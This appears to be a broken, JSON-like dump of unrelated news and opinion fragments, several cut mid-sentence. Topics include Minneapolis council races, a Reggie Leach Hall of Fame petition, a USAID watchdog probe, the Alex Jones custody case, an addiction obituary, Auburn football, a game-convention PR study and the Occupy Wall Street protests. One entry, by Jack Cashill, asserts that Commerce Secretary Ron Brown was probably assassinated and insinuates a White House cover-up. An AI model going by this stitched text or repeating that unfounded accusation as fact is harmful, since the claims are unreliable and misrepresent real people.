precinct caucuses, where the party chooses delegates who will decide DFL endorsements. It was a hip crowd that trended young. Bags of potato chips and pretzels and a canister of peanuts were set out on a table in back, and a few children squirmed on parents’ laps.\n\nAttendees learned about the basics of delegates, conventions and endorsements. They recited an elevator pitch aimed at friends and family.\n\n“Join me and our neighbors on Tuesday, April 4th, to help determine if the government of Minneapolis will reflect how progressive our city is,” they said. “Caucuses can be an insider process and without a presidential election, turnout is likely to be low. By showing up prepared for this process, we can ensure that city politics reflects our values.”\n\nA new cadre\n\nJanne Flisrand, who is challenging Goodman in the Seventh Ward, was in the audience at the training. Council Member Alondra Cano worked the back of the room, and several young challengers — Jillia Pessenda, Phillipe Cunningham and Jeremiah Ellison — gathered a few steps from a bank of laptops where attendees were asked to register their names and contact information.\n\n“The city is increasingly progressive,” said Pessenda, a communications consultant who is challenging Kevin Reich, the council member in his second term representing much of northeast Minneapolis. “People will turn out to vote in a local election if they’re engaged. That gives me hope, that new people will get involved and turn out in 2017 to vote.”\n\nA victory for Flisrand — a consultant, landlord, cycling enthusiast and ally of Lisa Bender — would be a seismic shift on the council. Goodman has dominated her ward, including Cedar Lake, Lake of the Isles, Loring Park and part of downtown Minneapolis, for 20 years. She won 72 percent of the vote against her last challenger.\n\nDespite Goodman’s history, Flisrand thinks there’s a movement of people who will turn out to vote for more aggressive action to protect renters, make housing more affordable, reform policing and combat climate change.\n\n“I think there is a hunger,” Flisrand said. “I think voters are really ready to take those steps.”\n\nGoodman agrees that progressives are uneasy with Republicans coming to power at the state Capitol and in Washington, D.C., but believes they shouldn’t fight among themselves.\n\n“Progressives around the country are scared and fired up,” Goodman said. “I share their concerns, because I look at what’s happening with income inequality, increased tension between people with different views and backgrounds, and I think we as progressives need to unite to fight against division in our city.”\n\nFocus on caucuses\n\nPoliticians on both sides of the divide agree that precinct caucuses — now three months away — are critically important.\n\n“Most races are won or lost on caucus night,” said Council Member John Quincy, who represents south Minneapolis around Lake Nokomis and Diamond Lake.\n\nHe faces challenges from the left by Erica Mauter, the executive director of the Twin Cities Women’s Choir, and Jeremy Schroeder, policy director for the Minnesota Housing Partnership.\n\nCunningham, an aide to Mayor Betsy Hodges, will take a leave of absence in January to challenge Johnson in north Minneapolis.\n\nCunningham wants to build systems to create city policy and write budgets with direct input from people of color, and he believes the city needs a $15 minimum wage that doesn’t include a carve-out for restaurant waiters.\n\n“There is a strong yearning,” Cunningham said, “for progressive values to be manifested in real action, real progress.”",

He is also a tremendous Canadian, which in turn means he is a hockey obsessive.\n\nSamson is also a pretty cool guy. This past Winter he garnered support to petition the NHL to admit Flyer Legend Reggie Leach into the Hall of Fame. The effort was the subject of the above short documentary called We, The Undersigned by Tim Thompson.\n\nFrom the YouTube description:\n\nWinnipeg songwriter John K. Samson has been steadily gathering support to get the great First Nations NHL star from Riverton, Manitoba, Reggie “The Riverton Rifle” Leach into the Hockey Hall of Fame. His song, www.ipetitions.com/petition/rivertonrifl­e/, written in the form of an online petition, has collected thousands of signatures from people around the world. On Saturday, February 23rd, 2013, Samson and a choir of his comrades climbed the steps of the Hockey Hall of Fame in Toronto to perform the song for the last time. They sang and marched en masse into the Hall, and as the final refrain reverberated Samson delivered a bona-fide submission putting forth Reggie Joseph Leach as a candidate eligible for election into honoured membership in the Hockey Hall of Fame. We, The Undersigned, a short film by Tim Thompson, documents the extraordinary day.\n\nWe are in an era where sports Hall of Fames are turning into parodies of themselves. Every year we hear about a different ‘all-time great’ who won’t be admitted to his or her respective hall of fame due to character flaws. Leach’s bid offers the NHL a chance to reverse that trend.\n\nSamson makes a solid argument that Leach’s spot in the Hockey Hall is well-deserved. Not only are his numbers impressive (666 career points, a Conn Smythe Tropy, and a Stanley Cup), but Leach is an inspirational figure in the First Nations Community in Canada.\n\nSamson and The Weakerthans weave hockey into their music all the time and recorded a spoken-word song called Elegy for Gump Worsley.",

Investigators with the IG's office are also probing whether Deputy Administrator Donald Steinberg tried to interfere with the internal investigation, the AP reported — possibly at the behest of USAID Administrator Rajiv Shah.\n\nADVERTISEMENT\n\n“One document said Steinberg told inspector general officials that the agency's top administrator, Shah, asked him to speak with the internal investigators about the review,” the AP reported. “Steinberg, according to another inspector general document, ripped into the independent watchdog.”\n\nA senior USAID official however denied that Steinberg was under investigation.\n\n“We take very seriously the independence of the Inspector General and the importance of the Agency’s cooperation with Inspector General audits and investigations,\" USAID spokesman Kamyl Bazbaz told The Hill. \"It is standard procedure for the Inspector General to brief with senior leadership of the Agency regarding its ongoing investigations and audits.

  "latent_4931": "I've written two essays attempting to disprove \"military Keynesianism\" - the idea that military spending is the best stimulus. See this and this.\n\nIn response, a reader challenged me to prove that anyone would advocate military spending or war as a fiscal stimulus.\n\nIn fact, the concept of military Keynesianism is so widespread that there are some half million web pages discussing the topic.\n\nAnd many leading economists and political pundits sing its praises.\n\nSimilar arguments are heard today. The members of Connecticut's congressional delegation have been particularly outspoken in their support for the Virginia-class submarine, and they haven't been shy about pointing to the jobs that the program provides in their home state. The Marine Corps' V-22 Osprey program wins support on similar grounds. Despite serious concerns about crew safety and comfort, the V-22 program employs workers in Pennsylvania, New Jersey, Delaware and Texas, and a number of other states.\n\nThis is not the first time that defense spending has been endorsed as a way to jump-start the economy. Nearly five decades ago, economic advisers to President Kennedy urged him to increase military spending as an economic stimulus...\n\npermanent war economy\n\nThis ideology goes back to the first years of the cold war. During the late 1940s, the US was haunted by economic anxieties. The great depression of the 1930s had been overcome only by the war production boom of the second world war. With peace and demobilisation, there was a pervasive fear that the depression would return. During 1949, alarmed by the Soviet Union's detonation of an atomic bomb, the looming Communist victory in the Chinese civil war, a domestic recession, and the lowering of the Iron Curtain around the USSR's European satellites, the US sought to draft basic strategy for the emerging cold war. The result was the militaristic National Security Council Report 68 (NSC-68) drafted under the supervision of Paul Nitze, then head of the Policy Planning Staff in the State Department. Dated 14 April 1950 and signed by President Harry S Truman on 30 September 1950, it laid out the basic public economic policies that the US pursues to the present day.\n\nIn its conclusions, NSC-68 asserted: \"One of the most significant lessons of our World War II experience was that the American economy, when it operates at a level approaching full efficiency, can provide enormous resources for purposes other than civilian consumption while simultaneously providing a high standard of living\".\n\n- Advertisement -\n\nWith this understanding, US strategists began to build up a massive munitions industry, both to counter the military might of the Soviet Union (which they consistently overstated) and also to maintain full employment, as well as ward off a possible return of the depression. The result was that, under Pentagon leadership, entire new industries were created to manufacture large aircraft, nuclear-powered submarines, nuclear warheads, intercontinental ballistic missiles, and surveillance and communications satellites. This led to what President Eisenhower warned against in his farewell address of 6 February 1961: \"The conjunction of an immense military establishment and a large arms industry is new in the American experience\" � the military-industrial complex.",

She said some of Mr Jones’s on-air rants – for which he is renowned – are evidence of him being “not a stable” father.\n\nHowever, Randall Wilhite, Mr Jones’s attorney, said the behaviour was merely an act.\n\n“He’s playing a character. He is a performance artist.” Mr Wilhite said, according to the Austin-American Statesman.\n\nMr Wilhite said that using Mr Jones’ on-air persona to judge him as a father would be like judging Jack Nicholson in a custody dispute based on his performance as the Joker in Batman.\n\nThe claim is likely to cause some confusion among Mr Jones’s fans, who have closely followed his musings. These included unfounded assertions that the Sandy Hook massacre and Boston bombings were hoaxes, Hillary Clinton should be jailed and that Barack Obama founded Isis.\n\nBut Mr Jones is not just any shock jock – his listeners are believed to include President Trump, who appeared on his show in December 2015, several months after he announced his candidacy.

The children are there, watching him broadcast,” Ms Jones said.\n\nMr Jones had called Mr Schiff a “fairy” and said he would “beat [his] goddamn ass”.\n\nThe presiding judge said he didn’t want Infowars to be a factor in the case but several pieces of footage from the website have already been submitted as evidence.\n\nIndependent News Service",
  "latent_5164": "BANGOR – Coleen Sheran Singer (born Coleen Sheran Clark) would have turned 33 this August 31, but she died in Lewiston in an unsuspecting suburban professional couple’s home of a heroin overdose on the morning of December 25, 2014.\n\nShe was a victim of herself, of LePage’s politics, of our society’s continuing ignorance and indifference to mental illness, and of our society’s asinine approach to drug addiction. Born in Biddeford and raised near OOB, Coleen lived the last three years of her life mostly as a transient in the Bangor area with increasing problems with infections in her limbs, a lack of MaineCare to pay for antibiotics outside the hospital, and escalating problems with the law following misdemeanor illegal drug possession convictions, failures to appear and a 2009 conviction for solicitation of prostitution. Coleen’s father left when she was younger than two. Coleen’s mother doted on Coleen when she was a child and made a good home for her, but barely eked out a living working long hours cleaning houses and motel rooms. Coleen’s mother was abused as a child in foster care out-of-state, had zero family support in Maine, and struggled at times with drug issues of her own. Though Coleen dropped out of high school, she was intellectually gifted and artistically talented, quick to grasp complicated legal and philosophical concepts. She had near perfect facial recognition and could glance at a person and know his or her clothing sizes to a T. While Coleen was capable of great compassion and would give the shirt off her back to one less fortunate, she was also at times a con artist, thief, and liar. Though Coleen presented herself with great panache among friends, she could be painfully shy and insecure in what many would consider “normal society.” Apart from her drug addictions – or more likely much of the reason for them – Coleen suffered from serious borderline personality disorder. Unless you knew her well over a good length of time, you would not know. Beset by affective instability due to a marked reactivity of mood, an unstable sense of self, impulsivity, and a pattern of intense but unstable interpersonal relations, Coleen flashed amazing smiles, but lived an inner life where she often felt intense emptiness, loneliness, and depression. By the time she was 18, Coleen was injecting opiates, crack, and various forms of amphetamines, while also abusing alcohol and other drugs. Coleen met her one and only husband and the only consistent male figure in her life (other than an older half-brother) when she was 22 and she had just started what turned out to be her longest, most successful time in recovery. The marriage was very brief, a couple years into Coleen’s recovery, but they remained dear friends until the day she died. For nearly four years Coleen was in methadone clinics and dedicated herself to sobriety. Taking to heart the adage that “without drugs, anything is possible,” and with the sometimes slavish devotion of the man she briefly married, Coleen earned her driver’s license, went to the gym regularly, completed nail tech school, worked successfully both part time in retail sales and full time caring for disabled adults, and enrolled in community college. But in the end Coleen’s untreated personality disorder and addictions prevailed. In later years, after LePage removed poor adults from MaineCare, Coleen could not afford the methadone clinic. Heroin was the cheapest way to avoid going into withdrawal. For readers without loved ones who are opiate addicts, you cannot imagine how powerful and difficult is that disease. The author of this obituary, who grew up comfortably removed from such things, thought he was educated but had no idea. Addicts shoot up to avoid being deathly ill and because the disease heightens also the psychological desire for the drug and the needle. Real addicts rarely manage to get high they just scratch and claw everyday to avoid dope sickness. Coleen wanted to get back into a methadone clinic, but LePage and enough republicans in the Legislature said “No” to the Medicaid expansion. It is no stretch to say that but for LePage’s veto of the Medicaid expansion, Coleen probably would not have shot the heroin that ended her life, and probably would not have had the serious recurring infections that ravaged her limbs the last couple years. That is not to say Coleen would be living happily ever after, since there were other significant problems. While in recovery, Coleen travelled extensively and did many wonderful things. She was particularly fond of an avant-garde theater in Washington, D.C. called the Woolly Mammoth. Coleen loved to pick flowers, shop for jeans, dance, work with crafts, and drink medium ice coffees with eight creams and eight equals (formerly eight creams, eight skim, and eight equals, until she started drinking “more coffee”). Coleen is survived by her dedicated mother, her very saddened older half-brother, a few women with whom at various times she maintained special relationships, numerous boyfriends who seemed to come and go, one boyfriend in particular named Les who among them was more special to her than the others, a few other older men along the way who genuinely tried to care for her, 100’s of acquaintances in this area, her adorable Chihuahua named Squeak, and the author of this obituary whose life was made more difficult, but also much better for having known her.\n\nColeen, rest in peace.",

  "latent_5250": "Editor’s note: In his extraordinary new DVD documentary, “Mega Fix,” Emmy-award-winning filmmaker Jack Cashill traces the roots of Sept. 11 to the political exploitation of terror investigations by the Clinton White House in the desperate 1995-1996 election cycle. This 8-part series began in Oklahoma City and now moves on to Croatia.\n\nThe “Mega Fix” DVD is available now at Jack Cashill’s website.\n\nOn April 4, 1996, the subject of my radio show in Kansas City was Commerce Secretary, Ron Brown. He and 34 others had died the day before when their Air Force plane crashed into a Croatian mountainside.\n\nNot one to shy from exploitation of a tragedy, President Clinton was busily profaning the memory of Martin Luther King – who had been killed on April 4, 1968 – by comparing King’s mission to Brown’s.\n\nWhat Clinton did not say was that Brown had gone to Croatia to broker a sweetheart deal between the neo-fascist strongman who ran Croatia, Franjo Tudjman, and Enron Corporation. This was all part of the Clintons’ desperate drive to raise money for their 1996 re-election campaign.\n\nMore than a few callers argued that the Clintons had the plane destroyed. I dismissed these arguments out of hand. I believed then, and believe now, that an American president would never do such a thing.\n\nWhen I began my investigation for my book, “Ron Brown’s Body,” I thought, however, that I might very well find another link in the Mega Fix chain – that is, the cover-up of a terrorist incident for the sake of political advantage.\n\nBrown’s flight did leave Bosnia, a Muslim country swarming with mujahideen. This flight came just six months after the Dayton accords and the insertion of American troops – an unpopular move. I figured that if a terrorist missile shot Brown’s plane out of the sky, or a hijacker flew it into the mountain, the Clinton White House would have good cause to conceal this fact.\n\nBut I was wrong. The evidence does not support a terrorist scenario. Here is what we know for sure about Ron Brown’s last days.\n\nTo protect his son Michael from prison, Ron Brown threatens to expose the White House’s yet unrevealed Asian fund-raising scheme, in which Brown played a major role.\n\nJust weeks before his death, Brown starts going to church for the first time in his life. He is scared for his life and that of his confidante, Nolanda Hill.\n\nThe Croatian government insists on a Dubrovnik stop an unprecedented 36 hours before Brown’s scheduled landing.\n\nThe Enron executives take their own plane.\n\nThe Air Force calls the pilot’s nearly two-mile deviation into a Croatian hillside “inexplicable.” No aircraft has ever drifted inland before at that airport. The AWACS data suggest sabotage of the ground-based navigation system, a line of inquiry that the Air Force is not allowed to pursue.\n\nFor the first time ever on friendly soil, the White House orders the Air Force to skip the “safety” phase of the investigation and move directly to the “accident” phase. There is to be no consideration other than accident, even though this airport is near the Bosnian border and in a potential hot-fire zone.\n\nThree days after the crash and two days before his scheduled interview by the Air Force, the Croatian responsible for the airport’s navigation system is found with a bullet hole in his chest.\n\nA day later, every pathologist who views Brown’s body concludes his head wound, at the very least, looks like a bullet hole. In a decision that reached the White House, there is to be no autopsy. The Brown family is not informed. Nor is there any forensic testing or a search for an exit wound.\n\nThe head x-rays that show a possible “lead snowstorm” are destroyed. Officially, they’re lost.\n\nThe three Armed Forces pathologists and the forensic photographer who blow the whistle on this case have their careers destroyed.\n\nIn silencing these dissidents, the Armed Forces Institute of Pathology brass assure the public that Brown died of “multiple blunt force injuries” like the others. The death certificate says otherwise. It notes that Brown died of “blunt force injuries to the head.” He was the only one of the 35 victims to have a reported head wound.\n\nFranjo Tudjman, who has feared a trip to the Hague as a war criminal, shows up a week after the election at the Walter Reed Army Hospital to have his cancer treated.\n\nHis son, Miroslav, investigates the death of the navigation chief and rules it a suicide.\n\nThe evidence strongly suggests that Ron Brown was, in fact, assassinated. In the most likely scenario, Croatian intelligence agents coerce the navigation chief into sabotaging the airport’s non-directional radio beacon. After the plane crashes, they divert the rescue efforts, go to the crash site and administer a coup de grace to Brown, who may already be dead. Three days later, they murder the airport’s navigation chief lest the Air Force investigators persuade him to talk.\n\nWho commissioned the Croatians is not known, although the list of suspects is small. If the commission came from Washington, it likely did not include the destruction of the aircraft.\n\nAlthough not technically “terrorism,” the Mega Fix paradigm works here just the same: The White House undermines the investigation and exploits the political advantage. The Clintons do not want to know the truth about Ron Brown’s death, and they certainly do not want to share it. In this case, it is impossible to lay the blame on the FBI. That much-maligned agency is not involved.\n\nThis time, the Clintons use a reluctant Air Force and a nearly mutinous Armed Forces Institute of Pathology to bury Ron Brown as quickly as possible, literally and figuratively. They exploit Brown’s death for political advantage and leave the truth buried with him. Without an autopsy or a serious investigation, that is where it remains to this day.\n\nOn April 14 – four days after Brown’s funeral – Clinton watches in shock as his buddy Greg Norman blows a six-stroke lead in the final round of the Masters, the greatest choke in the tournament’s history.\n\n“Yes,” Clinton tells press aide, Mike McCurry, “that’s going to be the new theme for the campaign, that we’re not going to allow ourselves to be Greg Normanized.”\n\nClinton is horrified in a way few around him can understand. “We could have a major crisis go bad on us,” he frets constantly. Clinton knows something his staff does not: Ron Brown’s death has spared him just such a crisis. “Greg Norman,” he repeats to his staff. “Greg Norman.”\n\nTo arrange a showing in your city, please send an e-mail to Jack Cashill.\n\nRelated columns:\n\n‘MEGA FIX’ PREVIEW: PART 1, The Oklahoma City bombing\n\n‘MEGA FIX’ PREVIEW: PART 2, The Oklahoma City aftermath",
  "latent_5372": "Forget the notion that the old-school blocking back no longer has a place in the game. Auburn needs to find a good one in a bad way.\n\nEven if the Tigers lean toward the pass more than we’re used to seeing from coach Gus Malzahn, expect the team to run the ball well more than the majority of offensive snaps. And, other than a quarterback who makes good decisions at the mesh point, is there any more important piece within Auburn’s read-option than the team’s H-back?\n\nJay Prosch wasn’t a household name in 2013, but he graded at better than 92 percent every game, according to the Dothan Eagle. In other words, Auburn could count on him to execute his assignment every single play. But not only did Prosch always head to the right spot on the field, he demolished whomever stood in his way.\n\nSo many times in ’13, the gap that got action from Nick Marshall or Tre Mason could be predicted based on where Prosch went after the snap. What looked like a read-option many times was a play designed to follow a 256-pound plow.\n\nThe team’s running game missed Prosch last season. Brandon Fulse, his replacement, saw between 20 and 50 snaps at the role in ’14, depending on the opponent. Tight end C.J. Uzomah played a handful of snaps per game at H-back as well. Overall, though, the duo couldn’t match Prosch’s knack for the position and physically weren’t as natural for H-back. Fulse spend much of his career previously as an in-line blocking tight end and didn’t have experience in the backfield.\n\nAuburn is in great position to upgrade at H-back in ’15. The outlook at running back for Kamryn Pettway, a redshirt freshman, didn’t appear strong with such a crowded backfield. He’s added about 20 pounds since he signed with the team as a three-star member of the 2014 class, and he’s spent spring practice cross-training at H-back and tight end.\n\nHis prospects for contributing this fall have gotten much higher with the tweak in role.\n\n“Kamryn is so athletic. For a big guy, he’s very athletic,” Auburn offensive coordinator Lashlee said, according to the Dothan Eagle. “He’s light on his feet. He’s very physical and I think he’s got a chance to really help us there. He’s transitioning well so far.”\n\nPettway is the early leader — he resembles Prosch physically much closer than last year’s H-backs — but the Tigers seemed to recruit Chandler Cox specifically for this role. The four-star early enrollee rated as the No. 2 fullback in the country, according to 247Sports, behind LSU signee David Ducre.\n\nCox arrived on The Plains at 6-foot-1 and 225 pounds, so he’s 20 pounds lighter than Pettway and about 30 pounds lighter than Prosch was in ’13. He should add weight between now and the season, but how much? Will he be big enough to blast through the hole full speed and stop SEC middle linebackers in their tracks?\n\nBoth Pettway and Cox have experience in the backfield, which seems to be the best formula. Prosch, for instance, started as a fullback at Illinois before transitioning to H-back at Auburn.\n\n“You know, we’ve done it before,” Lashlee said. “I don’t know if it’s necessarily easier, but sometimes you get bigger backs with more short-yardage type backs that have the size and the physicality to do it. I don’t know if it’s easier, but we’ve had success with it.”\n\nWhomever gets the majority of snaps at Auburn’s H-back position will enter the season still needing to grow into the role, learning the nuances of the offense, and perhaps physically as well in the case of Cox. Auburn fans can’t expect a Prosch clone Sept. 5 against Louisville. Neither has played in a college game yet.\n\nThe possibility exists that the team could begin to utilize its H-back as more than a lead blocker. Both Pettway and Cox are versatile athletes who can catch passes out of the backfield or carry the ball in short-yardage situations. Auburn rarely has thrown to the H-back under Malzahn, but the coach has shown a willingness to adapt his offense to his personnel.\n\nOne of these players very well could be the next Prosch. Each of them could still be playing the position for Auburn in 2018.\n\nThe Tigers also have had to replace two strong, talented pieces on the offensive line the last two years in left tackle Greg Robinson and center Reese Dismukes. Auburn always is going to have players in the backfield capable of leveraging good run-blocking, but this spring is crucial to replenish the team’s elite blocking talent.\n\nWith a little patience, Auburn soon could return to fielding one of the best, most physical group of blockers in the SEC once again.",
  "latent_5613": "Convention season is an unruly beast, and even with years of experience under our collective belts here at Evolve PR, events are always something of a hassle: is it worth our time to chase after appointments with media, streamers, and YouTubers? Should we focus our attention on one group? Is it worth the cost to attend these events at all? Although we’ve picked up numerous tricks and developed myriad theories about how best to go about these things over the years, we’ve never had the solid data to put it all into practice. That’s where our research team came in; it’s our job to crunch the numbers and see if those gut feelings panned out. After meticulously gathering and collating data from three recent major events, we’ve now got some answers as to the hows and the whys of what to do when it comes to conventions.\n\nThe Technical Nitty-Gritty\n\nThe above graph shows you the number of outlets/channels we sampled, compared to the overall number of outlets listed on official media lists. There may be channels or outlets that attended but were not officially registered as media. We have included a deeper description of our sample in an addendum at the bottom of this article.\n\nThere’s also obviously a slight margin of error that needs to be kept in mind when reading our results, as is the case with pretty much any study. This primarily stems from the fact that it’s impossible for us to gather all of the relevant information for something of this sort. Quite frankly, time and resources are limited, and there are things we just can’t know. For example, we have no clue what efforts other developers, publishers, and PR firms made in regards to these events and how successful they were. By that same token, it’s also not always clear what is and isn’t coverage for a given event. We often have to rely on outlets properly tagging and titling their content to help us make that distinction, and they don’t do that 100% of the time. There are some other limiting factors as well we won’t go into (either because they’re specific to a particular event or they’re somewhat esoteric), but just be aware that we’re doing our best with the information and resources available to us.\n\nWhere’s the Coverage?\n\nThe answer to that question as it turns out, is not at events like PAX and GDC, at least not in the way most developers and publishers would hope. Across all three events we saw a very low return of coverage day by day from our samples. On the best days, we would see an average 1:1 ratio of articles to outlets. That sounds good, but if every outlet is only producing a single article on a given day (and again, that’s only on the top day of each show) imagine how fierce the competition is to be the game featured in that article. Things only trend downward after that, and frankly even at the height of an event’s relevance, we were lucky to see half of our traditional media sample producing coverage.\n\nIt doesn’t help that what coverage is produced during these events is rarely distributed evenly. The big games, the ones with elaborate booths and massive companies behind them, are going to take the lion’s share of the attention, more so than may be expected. To use PAX East 2017 as an example, we saw a total of 398 articles from our sample during that event, covering 150 different games in at least some capacity. Of those 150 games, only 21 received 5 or more articles/mentions and 67 of those games only received a single mention or article. Of those top 21 games, almost all of them were AAA titles, were being published/supported by a major company, or had already received a ton of interest prior to the event for various reasons. Often times these games were already released and simply showing DLC or additional content at the show, or were on the verge of releasing and days away from being in the press’ hands anyways for review. We saw this same pattern across all three events and while there are of course outliers, small indie games that manage to be runaway successes, they’re clearly the exception and not the rule. To put it simply, events aren’t a great place to build people’s excitement about a game, but they’re fantastic for maintaining any excitement you’ve already built around your product. This also highlights how important it is to know exactly when in your game’s life-cycle to attend these events, as competition is fierce and there’s no room for games that aren’t ready for prime time.\n\nThe hope many devs will have in the face of that harsh reality is that smaller games will be able to rely on “Best of” and “Hidden Gem” listicles to garner some attention in lieu of proper previews, but our research has shown that’s not something you can put your faith in either. Previews dedicated to single games made up the majority of coverage for each event, even at GDC which is generally more focused on panels and feature content. This means less games being covered overall, and often a greater focus on those larger titles, because every site wants to have their preview of the biggest thing at the show. This means you need to bring your absolute best to an event, you need to make sure your demo is polished to a mirror sheen and really displays your game’s central hook as well as humanly possible. Quite simply, you need to make sure the build you’re bringing is worth writing a preview about, and more importantly, worthier of a preview than the game that’s being shown at the booth next door.\n\nBooking Appointments\n\nYou might think that your game’s saving grace here is how well you can hustle and get some appointments booked. Maybe you’re a magician who with a snap of their fingers can get IGN, GameSpot, and the freaking pope all booked in for back to back play sessions. Well I hate to break it to you, but while those appointments have their uses, securing coverage isn’t anywhere near the top of the list. At best, we’ve seen about a third of our appointments result in coverage, and depending on the event and what we were showing, sometimes much less than that. But thankfully all that time and effort spent wrangling journalists, streamers, and content creators isn’t completely for naught as there are two very distinct benefits to setting up those appointments outside of trying get direct coverage.\n\nThe first is the obvious one, that it gets your game on the press’ minds, and even if they don’t create coverage right then and there for your game it increases the chances that they might chuck you a bone somewhere down the line. That possibility is only enhanced by the second benefit of booking appointments, and that is the fact that doing so can let you know ahead of time which outlets are more likely to create coverage overall. We noticed during our GDC and PAX East studies that outlets who booked appointments with us produced more coverage overall than those with whom we were unable to book appointments. It wasn’t a negligible amount either, those booked outlets produced ~52% more coverage per day on average than their non-booking counterparts during our reporting period. This means (in theory at least) you can identify ahead of time which outlets are most likely to write a preview for your game (and hopefully cover it later on as well) and then go the extra mile to impress them specifically at the event. It’s still not a guarantee of anything, because most appointments won’t result in anything, but having that knowledge of who’s most likely to be making coverage in general gives you a definite strategic advantage for the event and beyond.\n\nYouTube & Twitch\n\nSo you might be wondering why Twitch & YouTube are buried all the way down here? They’re major drivers of market activity after all! Well the reason they’re down here is because when it comes to events, YouTubers and Twitch casters simply don’t make enough content to really move the needle. Once again using PAX East as an example, we saw a total of only 21 pieces of coverage over our entire reporting period from these groups combined. That’s not even halfway to each channel putting out only one show related video or stream. The content being created isn’t exactly the sort of intensive coverage you’d be hoping for anyways. From what we saw, the videos that went up were primarily sponsored streams done from a company’s booth or loose vlogs that covered more of the show itself than the games present at the show. This means that unless you’ve got pockets deep enough to sponsor these guys (and do in-booth streaming) or are fine having their coverage of your game be some grainy footage shot off a monitor while they talk about the line at the booth next door, it’s generally not worth your time chasing these groups.\n\nHowever, that’s not to say it isn’t worth engaging with YouTubers and Twitch Casters when you have the chance. Fact of the matter is, a lot of them come to events like these to meet up with their fans and generally hang out and wander the floor. If they come by your booth, make the effort to show them what you’ve got, because simply getting your game into their head can pay off massively in the long run, and can even help in the short run. Anecdotally, we’ve noticed that the video focused segment of the media is far more likely to talk about the games they’ve seen during an event on social media. Theoretically this drives further traffic to your booth and spreads the mindworm that is awareness of your game even further. Now that is completely anecdotal and we need to do more research into how much they’re tweeting or posting or instagramming or whatever-ing and exactly how much impact that actually has when it comes to events, but it’s something to keep in mind nonetheless.\n\nConclusion\n\nUltimately the biggest lesson to take away from all of this is that less time should be spent trying to chase down appointments and coverage at these events. PAX is not E3, nor is GDC, and we need to stop treating these events like they’re that same kind of media circus. Instead you should be focusing on having a great booth, making sure your game is at the right point in its life cycle to be shown, and ensuring that you have an absolutely killer demo. That’s not to say you shouldn’t be booking press appointments, or emailing YouTubers and streamers to let them know you’ll be there, but getting those people into your booth and covering your game shouldn’t be your ultimate goal. Generating awareness with media and content creators is very important, and these events are great places to get your game in front of them. You should be there to engage with that event’s intended audience, to get your game into their hands, and receive some valuable feedback from them in return; media coverage should simply be the icing on the cake.If you go into PAX or GDC (or any similar event) with that goal in mind, and prepare accordingly, you’ll have a better and more useful experience than you would otherwise.\n\nAddendum – Sample Description\n\nFor each event we looked at (PAX West 2016, GDC 2017, and PAX East 2017) we gathered together a sample of different outlets and channels that were attending, and tracked all of their event-specific coverage during the event and for a period of 1-2 weeks immediately following it. Each sample was built to be broadly representative of the media as a whole (aiming to cover a minimum of 10% of the outlets attending each event) and was split between more traditional websites and blogs, as well YouTubers and Twitch casters. For both PAXes this meant we tracked 50 traditional media outlets, 25 YouTube Channels, and 25 Twitch channels. At GDC we tracked a combined total of 36 outlets, though only 4 were YouTube or Twitch channels, due to the fact that YouTubers & streamers attended that event in very limited numbers. We did lean toward larger gaming-focused outlets and channels, as that’s generally whom you’ll want to secure coverage from. We also stuck to English-language media to aid in data gathering.\n\nAs for what we defined as “Coverage”, that included any content that required someone being at the show to create. For the most part that meant previews, interviews, and listicles covering games at the show. We did not include any news that would have come from show-related press releases, or any articles that were about games at the show but clearly written from home. The reason for this is because we trying to quantify the effect of actually attending these shows and booking appointments, and articles that simply stemmed from press releases everyone (at the show or not) would have access to aren’t part of that.\n\nIt’s also important to note that this post as a whole only relates to PAX and GDC. The results coming out of shows like E3, gamescom, or even TGS will most likely be quite different, as those events have a much larger press and business focus than either PAX or GDC.",

REUTERS/Brendan McDermid\n\nProtest organizers acknowledged that the “day of action” could be the group’s most provocative yet, and could lead to mass arrests and further strain relations with city authorities.\n\n“I think we’re certainly going into this with our eyes wide open, but (the march is) to provoke ideas and discussion, not to provoke any violent reactions,” said Occupy Wall Street spokesman Ed Needham.\n\n“I think it is very difficult to do a day of action and not expect some sort of reaction from the (authorities),” he said.\n\nThe protesters plan to march to Wall Street from their camp headquarters in a park two blocks away and then spread out across the city’s subway system to tell the stories of disenfranchised Americans. They will reconvene later on Thursday for a march across the Brooklyn Bridge.\n\nLast month, more than 700 people were arrested during a similar march across the bridge, after some protesters sat on the pedestrian walkway and refused to move, while others strayed into car lanes.\n\n“We will shut down Wall Street,” a post on the movement’s Facebook page said. “We will ring the People’s Bell, and initiate a street carnival in which we rebuild and celebrate the neighborhoods that the Wall Street economy has destroyed.”\n\nThe group promises a “a block party the 1 percent will never forget.”\n\nA spokesman for the stock exchange declined to comment.\n\nNew York City Mayor Michael Bloomberg, asked by reporters on Monday about the protesters’ plans, said: “The New York Stock exchange will open on time. People will be able to get to work, you can rest assured.”\n\nProtesters set up camp in Zuccotti park in New York City’s financial district on September 17 to protest a financial system they believe mostly benefits corporations and the wealthy.\n\nThe Occupy Wall Street movement has sparked similar protests against economic inequality across the country, and in some cases have led to violent clashes with police.\n\nPolice on Monday moved into an anti-Wall Street protester encampment in Oakland, California, clearing out occupants and taking down tents. And police confronted an estimated 1,000 anti-corporate protesters in Portland, Oregon, on Sunday.\n\nIn recent weeks, New York protesters have conducted peaceful marches along city sidewalks for a variety of causes ranging from veterans rights and alleged police brutality to big bank greed and labor union issues.\n\nAt times the police presence has outnumbered the protesters and city officials have shown their patience is wearing thin with the encamped protest. But Thursday’s march could attract up to 10,000 people, protest spokesman Needham said.",

Together, we will ask the government tough questions and hold them to account,\" Ambrose said.\n\nHarper loyalists on the margins\n\nThe full list, released Friday, includes a few surprises — chief amongst them is Jason Kenney's absence from the front bench. Kenney, who was widely seen as Stephen Harper's most competent minister, will not hold a critic portfolio in the next session of Parliament.\n\nAs a result, he will not take the lead on any particular file during question period. Instead, he will chair the shadow cabinet committee on strategic operations, a key caucus committee that will advise the leader and other critics on question period strategy, policy and communications.\n\nConservative MP Jason Kenney has been left off of the Conservative Party's front bench in Opposition. After the election, Kenney said the campaign needed to promote a 'sunnier' brand of conservatism. (Fred Chartrand/Canadian Press)\n\nA source close to Kenney told CBC News that he specifically asked Ambrose not to give him a critic role in the shadow cabinet. A move some political observers say will free up Kenney's time to run for the party's permanent leadership.\n\nDiane Finley, who was a staple of Harper's cabinet during his tenure in government, has been relegated to a relatively minor role: deputy critic for science, innovation and economic development, reporting to Quebec MP Maxime Bernier, who will take the lead on that critical file. She will also serve as the caucus party liaison.\n\nAnd Peter Van Loan, the former government House leader, has been passed over for that role in opposition by the outgoing Speaker of the House, Andrew Scheer.\n\nOther veterans, however, will step into prominent roles. Former justice minister Rob Nicholson will be the critic for that portfolio and Ontario MP Kellie Leitch, who is also a physician, will be the health 